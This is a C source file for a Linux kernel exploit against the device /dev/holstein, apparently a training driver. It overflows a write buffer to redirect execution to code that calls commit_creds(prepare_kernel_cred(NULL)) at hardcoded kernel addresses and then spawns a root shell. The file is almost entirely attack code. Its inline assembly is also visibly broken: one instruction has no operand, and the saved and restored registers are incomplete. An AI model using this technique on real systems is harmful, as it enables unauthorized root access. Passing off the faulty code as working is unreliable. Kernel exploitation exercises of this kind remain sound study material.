#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>

uint64_t user_cs, user_ss, user_rsp, user_rflags;

#define PREPARE_KERNEL_CRED 0xffffffff8105da53
// 0xffffffff8105da53 <prepare_kernel_cred>:       0x8948000000d0be55

#define COMMIT_CREDS 0xffffffff8105db58
// 0xffffffff8105db58 <commit_creds>:      0x4c655541e5894855

static void win() {
    char *argv[] = {"/bin/sh", NULL};
    char *envp[] = {NULL};
    puts("[+] ez ret2win");
    execve("/bin/sh", argv, envp);
}
uint64_t user_rip = (uint64_t)(uintptr_t)win;
static void save_state() {
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_rsp, rsp;"
        "mov user_rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax prefix;"
    );
}

static void restore_state(void) {
    __asm__(
        ".intel_syntax noprefix;"
        "swapgs;"
        "push user_ss;"
        "push user_rflags;"
        "push user_rip;"
        "iretq;"
        ".att_syntax prefix;"
    );
}

static void get_root(void) {
    void *(*prepare_kernel_cred)(void *) = (void *)PREPARE_KERNEL_CRED;
    void *(*commit_creds)(void *) = (void *)COMMIT_CREDS;
    commit_creds(prepare_kernel_cred(NULL));
    restore_state();
}

int main() {
    char payload[0x800];
    save_state();

    int fd = open("/dev/holstein", O_RDWR);
    if (fd < 0) {
        perror("open");
        exit(1);
    }

    memset(payload, 'A', sizeof(payload));

    *(uint64_t *)(payload + 0x418) = (uint64_t)get_root;

    printf("ez ret2win");

    if (write(fd, payload, sizeof(payload)) < 0) {
        perror("write");
        exit(1);
    }
    close(fd);
    return 0;
}

























